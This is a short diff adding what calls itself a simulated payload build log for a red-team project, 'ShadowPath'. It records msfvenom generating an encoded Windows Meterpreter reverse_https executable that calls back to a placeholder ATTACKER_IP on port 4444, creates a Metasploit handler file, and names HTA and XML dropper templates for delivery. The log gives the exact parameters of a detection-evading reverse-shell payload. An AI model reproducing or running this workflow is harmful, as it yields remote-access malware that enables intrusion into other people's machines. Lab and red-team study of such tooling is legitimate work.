@@ -1,0 +1,35 @@
+# ─────────────────────────────────────────────
+# ShadowPath Payload Generation Log (Simulated)
+# Author: Vicky | Project: ShadowPath
+# Date: 2025-06-16
+# ─────────────────────────────────────────────
+
+[*] Starting payload build with generate_shadow_payload.sh...
+[*] Provided LHOST: ATTACKER_IP
+[*] Provided LPORT: 4444
+
+[*] Step 1: Creating payload directory...
+[+] Directory 'payloads' verified.
+
+[*] Step 2: Generating reverse_https Meterpreter payload...
+[*] Running msfvenom with:
+    - Payload: windows/meterpreter/reverse_https
+    - LHOST=ATTACKER_IP
+    - LPORT=4444
+    - Encoder: x86/shikata_ga_nai
+    - Iterations: 3
+    - Format: exe
+[+] Payload successfully saved as: payloads/shadow_reverse_https.exe
+
+[*] Step 3: Creating Metasploit handler resource file...
+[+] Resource file created: shadow_handler.rc
+
+[*] Final Summary:
+    ✓ Payload build complete
+    ✓ Ready for deployment in test lab
+    ✓ Use with sanitized templates: ShadowVeil.hta, ShadowDropper.xml
+
+# ─────────────────────────────────────────────
+# End of Log
+# Simulated execution in controlled test environment
+# ─────────────────────────────────────────────
